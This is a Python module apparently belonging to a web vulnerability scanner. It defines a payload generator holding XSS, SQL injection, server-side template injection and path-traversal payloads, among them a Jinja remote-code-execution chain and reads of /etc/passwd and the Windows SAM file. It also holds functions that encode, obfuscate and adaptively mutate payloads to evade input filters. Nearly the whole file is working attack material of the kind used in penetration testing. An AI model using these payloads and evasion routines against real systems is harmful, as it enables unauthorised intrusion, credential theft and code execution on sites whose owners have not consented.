# Modulo de escaneo y analisis para generator.

"""
Dynamic Payload Generator
Creates sophisticated payload variants based on learned patterns and framework detection.
"""

from typing import List, Dict, Any, Optional
import random
import string


class DynamicPayloadGenerator:
    """Generates sophisticated payload variants adapted to target environment."""


    XSS_TEMPLATES = {
        "basic": ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>"],
        "event_handler": [
            "<svg onload=alert(1)>",
            "<body onload=alert(1)>",
            "<input onfocus=alert(1) autofocus>",
        ],
        "dom_based": [
            "javascript:alert(1)",
            "data:text/html,<script>alert(1)</script>",
        ],
        "framework_react": ["dangerouslySetInnerHTML={{__html:'<img src=x onerror=alert(1)>'}}",
                           "eval(atob('YWxlcnQoMSk='))"],
        "framework_angular": ["ng-bind='constructor.prototype.valueOf()'",
                             "{{constructor.prototype.toString()}}"],
    }

    SQLI_TEMPLATES = {
        "union_based": [
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL--",
        ],
        "boolean_based": [
            "' AND '1'='1",
            "' AND 1=1--",
            "' AND 'a'='a",
        ],
        "time_based": [
            "' AND SLEEP(5)--",
            "'; WAITFOR DELAY '00:00:05'--",
            "' OR 1=1; BENCHMARK(10000000,MD5('a'))--",
        ],
        "error_based": [
            "' AND extractvalue(0x0a,concat(0x0a,(SELECT database())))--",
            "' AND updatexml(null,concat(0x7e,(SELECT user())),null)--",
        ],
    }

    SSTI_TEMPLATES = {
        "jinja": ["{{7*7}}", "{{ ''.__class__.__mro__[1].__subclasses__() }}"],
        "mako": ["${7*7}", "${'hello'.upper()}"],
        "django": ["{{ request.build_absolute_uri }}", "{% debug %}"],
        "thymeleaf": ["[(${7*7})]", "[[${7*7}]]"],
    }

    PATH_TRAVERSAL_TEMPLATES = {
        "unix": ["../../../../etc/passwd", "..\\..\\..\\..\\etc\\passwd"],
        "windows": ["..\\..\\..\\..\\windows\\system32\\config\\sam",
                   "..%5c..%5cwindows%5csystem32%5cconfig%5csam"],
        "filters": ["....//....//....//etc/passwd",
                   "..%2f..%2f..%2fetc%2fpasswd"],
    }

    def __init__(self):
        self.mutation_history = []
        self.detected_filters = []

    def generate_variants(
        self,
        attack_type: str,
        base_payload: str,
        framework: Optional[str] = None,
        detected_filters: Optional[List[str]] = None,
        previous_failures: Optional[List[Dict]] = None,
    ) -> List[Dict[str, str]]:
        """
        Generate multiple payload variants for adaptive testing.
        Each variant uses different encoding, obfuscation, and context.
        """
        variants = []

        if detected_filters:
            self.detected_filters = detected_filters


        variants.append(
            {
                "payload": base_payload,
                "variant": "original",
                "encoding": "none",
                "obfuscation": "none",
                "reason": "Control baseline",
            }
        )


        if framework:
            variants.extend(self._framework_specific_variants(attack_type, framework))


        variants.extend(self._encoding_variants(base_payload, attack_type))


        variants.extend(self._obfuscation_variants(base_payload, attack_type))


        if self.detected_filters:
            variants.extend(
                self._filter_bypass_variants(base_payload, self.detected_filters)
            )


        variants.extend(self._context_variants(base_payload, attack_type))


        if previous_failures:
            variants.extend(
                self._adaptive_variants(base_payload, previous_failures)
            )

        return variants[:20]

    def _framework_specific_variants(
        self, attack_type: str, framework: str
    ) -> List[Dict[str, str]]:
        """Generate variants optimized for detected framework."""
        variants = []

        if attack_type == "xss" and framework == "react":
            variants.extend(
                [
                    {
                        "payload": "dangerouslySetInnerHTML={{__html:'<img src=x onerror=alert(1)>'}}",
                        "variant": "react_dangeroushtml",
                        "encoding": "none",
                        "obfuscation": "none",
                        "reason": "React-specific XSS vector",
                    },
                    {
                        "payload": "onClick={eval(String.fromCharCode(97,108,101,114,116,40,49,41))}",
                        "variant": "react_onclick",
                        "encoding": "charcode",
                        "obfuscation": "none",
                        "reason": "Event handler with charcode obfuscation",
                    },
                ]
            )

        elif attack_type == "xss" and framework == "angular":
            variants.extend(
                [
                    {
                        "payload": "{{constructor.prototype.toString()}}",
                        "variant": "angular_expression",
                        "encoding": "none",
                        "obfuscation": "none",
                        "reason": "Angular expression injection",
                    },
                    {
                        "payload": "[ng-bind='constructor.prototype.valueOf()']",
                        "variant": "angular_binding",
                        "encoding": "none",
                        "obfuscation": "none",
                        "reason": "Angular binding expression",
                    },
                ]
            )

        elif attack_type == "ssti" and framework == "jinja":
            variants.extend(
                [
                    {
                        "payload": "{{ ''.__class__.__mro__[1].__subclasses__()[430]('id') }}",
                        "variant": "jinja_rce",
                        "encoding": "none",
                        "obfuscation": "none",
                        "reason": "Jinja RCE via class chain",
                    },
                ]
            )

        return variants

    def _encoding_variants(
        self, payload: str, attack_type: str
    ) -> List[Dict[str, str]]:
        """Generate variants with different encodings."""
        variants = []


        url_encoded = "".join([f"%{ord(c):02x}" for c in payload])
        variants.append(
            {
                "payload": url_encoded,
                "variant": "url_encoded",
                "encoding": "url",
                "obfuscation": "none",
                "reason": "URL encoded to bypass basic filters",
            }
        )


        html_encoded = "".join([f"&#x{ord(c):x};" for c in payload])
        variants.append(
            {
                "payload": html_encoded,
                "variant": "html_entity",
                "encoding": "html",
                "obfuscation": "none",
                "reason": "HTML entity encoded",
            }
        )


        double_url = "".join([f"%{ord(c):02x}" for c in url_encoded])
        variants.append(
            {
                "payload": double_url,
                "variant": "double_url_encoded",
                "encoding": "url",
                "obfuscation": "double",
                "reason": "Double URL encoded to bypass validation",
            }
        )


        unicode_encoded = "".join([f"\\u{ord(c):04x}" for c in payload])
        variants.append(
            {
                "payload": unicode_encoded,
                "variant": "unicode_escaped",
                "encoding": "unicode",
                "obfuscation": "none",
                "reason": "Unicode escape sequences",
            }
        )


        hex_encoded = "".join([f"\\x{ord(c):02x}" for c in payload])
        variants.append(
            {
                "payload": hex_encoded,
                "variant": "hex_encoded",
                "encoding": "hex",
                "obfuscation": "none",
                "reason": "Hex encoded payload",
            }
        )

        return variants

    def _obfuscation_variants(
        self, payload: str, attack_type: str
    ) -> List[Dict[str, str]]:
        """Generate obfuscated variants."""
        variants = []


        if "alert" in payload:
            obfuscated = payload.replace("alert", "al/**/ert")
            variants.append(
                {
                    "payload": obfuscated,
                    "variant": "comment_injection",
                    "encoding": "none",
                    "obfuscation": "comment",
                    "reason": "Comments to bypass string matching",
                }
            )


        mixed_case = "".join(
            [c.upper() if random.random() > 0.5 else c for c in payload]
        )
        variants.append(
            {
                "payload": mixed_case,
                "variant": "mixed_case",
                "encoding": "none",
                "obfuscation": "case",
                "reason": "Mixed case to bypass case-sensitive filters",
            }
        )


        if len(payload) > 10:
            parts = [payload[i : i + 3] for i in range(0, len(payload), 3)]
            split = "".join([f"'{p}'" if i == 0 else f"+'{p}'" for i, p in enumerate(parts)])
            variants.append(
                {
                    "payload": split,
                    "variant": "split_concatenated",
                    "encoding": "none",
                    "obfuscation": "split",
                    "reason": "Split across string concatenation",
                }
            )

        return variants

    def _filter_bypass_variants(
        self, payload: str, filters: List[str]
    ) -> List[Dict[str, str]]:
        """Generate variants to bypass detected filters."""
        variants = []

        for filter_name in filters:
            if "alert" in filter_name.lower():

                variants.extend(
                    [
                        {
                            "payload": payload.replace("alert", "window.alert"),
                            "variant": "window_alert",
                            "encoding": "none",
                            "obfuscation": "none",
                            "reason": "Bypass alert() keyword filter",
                        },
                        {
                            "payload": payload.replace("alert", "eval(String.fromCharCode(97,108,101,114,116))"),
                            "variant": "charcode_alert",
                            "encoding": "none",
                            "obfuscation": "charcode",
                            "reason": "Bypass via charcode function",
                        },
                    ]
                )

            if "script" in filter_name.lower():

                variants.extend(
                    [
                        {
                            "payload": f"<img src=x onerror={payload}>",
                            "variant": "img_onerror",
                            "encoding": "none",
                            "obfuscation": "none",
                            "reason": "Bypass script tag filter with img",
                        },
                        {
                            "payload": f"<svg onload={payload}>",
                            "variant": "svg_onload",
                            "encoding": "none",
                            "obfuscation": "none",
                            "reason": "Bypass script tag filter with svg",
                        },
                    ]
                )

            if "union" in filter_name.lower() or "select" in filter_name.lower():

                variants.extend(
                    [
                        {
                            "payload": payload.replace("UNION", "/**/UNION/**/"),
                            "variant": "comment_union",
                            "encoding": "none",
                            "obfuscation": "comment",
                            "reason": "Bypass UNION blocking with comments",
                        },
                        {
                            "payload": payload.replace("SELECT", "SeLeCt"),
                            "variant": "mixed_case_union",
                            "encoding": "none",
                            "obfuscation": "case",
                            "reason": "Bypass case-sensitive SQL filters",
                        },
                    ]
                )

        return variants

    def _context_variants(
        self, payload: str, attack_type: str
    ) -> List[Dict[str, str]]:
        """Generate variants for different execution contexts."""
        variants = []

        if attack_type == "xss":
            variants.extend(
                [
                    {
                        "payload": f"\">{payload}</div>",
                        "variant": "attribute_break",
                        "encoding": "none",
                        "obfuscation": "none",
                        "reason": "Break out of HTML attribute context",
                    },
                    {
                        "payload": f"';{payload};//",
                        "variant": "js_injection",
                        "encoding": "none",
                        "obfuscation": "none",
                        "reason": "Inject into JavaScript context",
                    },
                ]
            )

        elif attack_type == "sqli":
            variants.extend(
                [
                    {
                        "payload": payload.replace("'", '\\"'),
                        "variant": "quote_escape",
                        "encoding": "none",
                        "obfuscation": "none",
                        "reason": "Escape single quote with backslash",
                    },
                    {
                        "payload": payload.replace("'", "''"),
                        "variant": "quote_double",
                        "encoding": "none",
                        "obfuscation": "none",
                        "reason": "Escape single quote with duplication",
                    },
                ]
            )

        return variants

    def _adaptive_variants(
        self, payload: str, previous_failures: List[Dict]
    ) -> List[Dict[str, str]]:
        """Generate variants based on previous failure patterns."""
        variants = []


        failed_techniques = set()
        for failure in previous_failures[-5:]:
            if failure.get("result") != "success":
                failed_techniques.add(failure.get("variant", "unknown"))


        if "original" in failed_techniques:

            variants.append(
                {
                    "payload": f"eval(atob('{self._to_base64(payload)}'))",
                    "variant": "base64_eval",
                    "encoding": "base64",
                    "obfuscation": "eval",
                    "reason": "Previous attempt was blocked, retry with eval+base64",
                }
            )

        if "url_encoded" in failed_techniques:

            html_encoded = "".join([f"&#x{ord(c):x};" for c in payload])
            variants.append(
                {
                    "payload": html_encoded,
                    "variant": "html_entity_retry",
                    "encoding": "html",
                    "obfuscation": "none",
                    "reason": "URL encoding failed, switching to HTML entities",
                }
            )

        return variants

    @staticmethod
    def _to_base64(s: str) -> str:
        import base64
        return base64.b64encode(s.encode()).decode()

    def add_mutation(self, original: str, mutated: str, reason: str):
        """Record a payload mutation for learning."""
        self.mutation_history.append(
            {
                "original": original,
                "mutated": mutated,
                "reason": reason,
                "timestamp": str(__import__("datetime").datetime.now()),
            }
        )
